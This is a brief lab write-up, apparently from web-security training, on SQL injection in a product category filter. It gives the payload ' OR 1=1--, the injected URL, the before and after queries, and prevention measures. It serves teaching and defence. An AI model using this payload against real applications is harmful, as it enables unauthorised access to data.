# SQL Injection - Hidden Data Lab

## Objective

Retrieve hidden products using SQL Injection.

---

## Vulnerable Parameter

/filter?category=Accessories

---

## Payload

' OR 1=1--

Final URL:

/filter?category=Accessories' OR 1=1--

---

## Why It Works

The application directly inserted user input into an SQL query.

Original query:

SELECT * FROM products
WHERE category = 'Accessories'
AND released = 1

Injected query behavior:

SELECT * FROM products
WHERE category = 'Accessories'
OR 1=1--'

OR 1=1 is always TRUE, and -- comments out the remaining query.

---

## Result

Hidden products became visible.

---

## Prevention

* Prepared Statements
* Parameterized Queries
* Input Validation
